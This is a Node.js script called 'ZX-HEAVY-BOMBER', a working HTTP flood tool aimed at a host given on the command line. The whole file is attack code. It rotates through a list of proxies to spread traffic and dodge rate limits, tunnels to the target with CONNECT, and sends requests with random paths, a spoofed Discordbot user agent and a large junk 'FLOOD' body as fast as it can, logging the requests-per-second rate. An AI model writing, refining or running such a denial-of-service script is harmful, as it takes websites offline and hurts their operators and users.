const http = require('http');
const fs = require('fs');
const { URL } = require('url');

const [host, duration] = process.argv.slice(2);
if (!host || !duration) {
    console.log("Usage: node bomber.js <host> <duration>");
    process.exit(1);
}

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(x => x.trim().length);
let proxyIndex = 0;
let proxyHitCount = 0;

const end = Date.now() + parseInt(duration) * 1000;
let sent = 0;
let failed = 0;
let maxRPS = 0;
let lastSent = 0;

const randPath = () => Math.random().toString(36).substring(2, 12);
const getNextProxy = () => {
    if (proxyHitCount >= 12) {
        proxyIndex = (proxyIndex + 1) % proxies.length;
        proxyHitCount = 0;
    }
    proxyHitCount++;
    return proxies[proxyIndex];
};

const sendHeavy = () => {
    if (Date.now() > end) {
        console.log(`\nZX-BOMBER DONE`);
        console.log(`SENT: ${sent}`);
        console.log(`FAILED: ${failed}`);
        console.log(`MAX RPS: ${maxRPS}`);
        process.exit(0);
    }

    const [ip, port] = getNextProxy().split(':');
    const reqOptions = {
        host: ip,
        port: parseInt(port),
        method: 'CONNECT',
        path: `${host}:80`
    };

    const req = http.request(reqOptions);
    req.on('connect', (res, socket) => {
        const reqLine = `GET /${randPath()}?id=${Math.random()} HTTP/1.1\r\n`;
        const headers = [
            `Host: ${host}`,
            `User-Agent: Discordbot/2.0 (+https://discordapp.com)`,
            `X-BOMBER: GANG`,
            `Connection: Keep-Alive`,
            `Content-Length: 15000`,
            `\r\n`
        ].join('\r\n');

        const body = 'FLOOD'.repeat(3000);

        socket.write(reqLine + headers + body);
        sent++;
        socket.end();
    });

    req.on('error', () => {
        failed++;
    });

    req.end();
    setImmediate(sendHeavy);
};

setInterval(() => {
    const rps = sent - lastSent;
    lastSent = sent;
    if (rps > maxRPS) maxRPS = rps;

    console.clear();
    console.log(`ZX-HEAVY-BOMBER [PROXY MODE]`);
    console.log(`Target: ${host}`);
    console.log(`Proxies: ${proxies.length}`);
    console.log(`Sent: ${sent}`);
    console.log(`Failed: ${failed}`);
    console.log(`RPS: ${rps}`);
    console.log(`MAX RPS: ${maxRPS}`);
}, 3000);

sendHeavy();
